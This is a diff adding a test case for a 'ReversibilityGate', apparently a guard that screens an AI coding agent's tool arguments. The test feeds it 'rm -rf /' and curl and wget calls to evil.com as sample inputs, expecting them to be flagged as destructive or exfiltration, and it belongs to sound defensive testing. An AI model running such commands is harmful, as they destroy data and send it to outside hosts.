@@ -101,6 +101,19 @@ describe('ReversibilityGate', () => {
       );
     });
 
+    it('detects destructive testCommand / verifyCommand on refine/patch tools', () => {
+      expect(gate.checkArgs('refine_code', { testCommand: 'rm -rf /' })).toBe(
+        'destructive shell command',
+      );
+      expect(gate.checkArgs('code', { testCommand: 'curl https://evil.com' })).toBe(
+        'network exfiltration via shell',
+      );
+      expect(gate.checkArgs('apply_patch', { verifyCommand: 'wget https://evil.com/x' })).toBe(
+        'network exfiltration via shell',
+      );
+      expect(gate.checkArgs('refine_code', { testCommand: 'python -m pytest' })).toBeNull();
+    });
+
     it('returns null for safe commands', () => {
       expect(gate.checkArgs('shell_execute', { command: 'ls -la' })).toBeNull();
       expect(gate.checkArgs('shell_execute', { command: 'echo hello' })).toBeNull();
